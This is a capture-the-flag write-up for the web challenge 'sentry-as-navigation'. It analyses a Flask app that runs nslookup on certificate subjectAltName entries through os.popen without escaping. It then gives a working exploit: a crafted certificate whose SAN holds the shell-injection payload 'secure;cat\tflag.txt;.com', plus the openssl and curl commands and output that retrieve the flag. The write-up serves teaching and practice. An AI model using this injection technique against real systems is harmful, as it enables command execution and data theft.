# sentry-as-navigation

[library.m0unt41n.ch/challenges/sentry-as-navigation](https://library.m0unt41n.ch/challenges/sentry-as-navigation) ![](../../resources/web.svg) ![](../../resources/medium.svg) 

# TL;DR

We get a source for a simple Flask app that tries to resolve
all `subjectAltName` entries of a web certificate provided by
the web server given as input.

The vulnerability is that it internally uses `os.popen()` to run
`nslookup \<string\>` without escaping the `string` in any way.

The exploit is to stand a simple webserver, with a certificate
containing `subjectAltName` that includes a shell injection payload
printing `flag.txt` file, which is then served by the vulnerable
app.

# Analyzing the app

Let's just focus on the vulnerable code:

*   Load certificate for the domain provided in the request

    ```python
    certificate = get_certificate(domain)
    x509 = OpenSSL.crypto.load_certificate(OpenSSL.crypto.FILETYPE_PEM, certificate)
    ```

*   Decode some standard fields into a `result` dict:

    ```python
    result = {
        "subject": [
            {x.decode(): y.decode()} for (x, y) in x509.get_subject().get_components()
        ],
        "issuer": [
            {x.decode(): y.decode()} for (x, y) in x509.get_issuer().get_components()
        ],
        "serialNumber": x509.get_serial_number(),
        "version": x509.get_version(),
        "notBefore": x509.get_notBefore().decode(),
        "notAfter": x509.get_notAfter().decode(),
        "nslookup": {},
    }
    ```

*  Decode the certificate extensions:

    ```python
    extensions = (x509.get_extension(i) for i in range(x509.get_extension_count()))
    extension_data = {e.get_short_name().decode(): str(e) for e in extensions}
    result.update(extension_data)
    ```

*   Extract `subjectAltName` entries, removing the `"DNS:"` prefix. Also remove spaces
as a minimal sanitization:

    ```python
    san_entries = (
        result["subjectAltName"].replace(" ", "").replace("DNS:", "").split(",")
    )
    ```

*   For each `subjectAltName` entry:
    *   Check if it matches a predefined pattern (`^secure.*\.com$`)
    *   Run `nslookup` and store the output in the `result` map

    ```python
    for entry in san_entries:
        match = re.match(r"^secure.*\.com$", entry)
        print(f"{entry}: {match}")
        if match:
            command = f"nslookup {entry}"
            result["nslookup"][entry] = os.popen(command).read().strip()
    ```

# Local exploit

## Create a malicious certificate

We can not add a simple `cat flag.txt` in the payload, because above code
removes spaces from the "domain" name. But, nobody mentioned tabs &#128522;.
So, we'll try `DNS:secure;cat\tflag.txt;.com`.

```bash
$ openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 \
    -subj "/C=GB/ST=London/L=London/O=Global Security/OU=R&D Department/CN=example.com" \
    -addext "subjectAltName = DNS:secure;cat\tflag.txt;.com" \
    -keyout cert.key -out cert.crt
```

## Start a Web server using that certificate

Note: you need to do this as root, as this has to bind to port 443.

```
# openssl s_server -key cert.key -cert cert.crt -accept 443 -www
```

## Try it with local Docker container

```bash
$ docker build -t sentry:latest .
$ docker run -p 5000:5000 sentry:latest
 * Serving Flask app 'app'
 * Debug mode: on
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:5000
 * Running on http://192.168.254.2:5000
Press CTRL+C to quit
 * Restarting with stat
 * Debugger is active!
 * Debugger PIN: 664-276-320
```

Note that the app exports a debug port (but we don't need it)

## Extract the flag

Write down `$SERVER_IP` to contain public interface of your workstation (running the `openssl s_server` above).

```bash
$ SERVER_IP=192.168.1.10
$ APP_URL=http://127.0.0.1:5000/check
$ curl -s -X POST $APP_URL -d "domain=$SERVER_IP"
(...)
    "notAfter": "20250421163140Z",
    "notBefore": "20240421163140Z",
    "nslookup": {
      "secure;cat\tflag.txt;.com": "shc2024{fake_flag}"
    },
    "serialNumber": 388628575943243043612594917864125328316475023391,
```

Note the flag &#128522; Let's make it a bit more clean

```bash
$ curl -s -X POST $APP_URL -d "domain=$SERVER_IP" | grep shc | sed -r 's/.*(shc2024\{.*\}).*/\1/g'
shc2024{fake_flag}
```

# Remote exploit

Prepare SSL server

*   Start an AWS instance (or an otherwise publicly accessible server)
*   Run above `openssl` commands there
*   Record its `$SERVER_IP`

Start the CTF instance and get a flag from there

```bash
$ APP_URL=https://12345678-1234-1234-1234-123456789abc.ctf.m0unt41n.ch:1337/check
$ curl -s -X POST $APP_URL -d "domain=$SERVER_IP" | grep shc | sed -r 's/.*(shc2024\{.*\}).*/\1/g'
```

---

## `shc2024{SAN_411_th3_th1ngs!!!!!}`


<hr>

&copy; [muflon77](https://library.m0unt41n.ch/players/805ae1c8-9fe4-5816-b4a4-5057fa6eedb1)
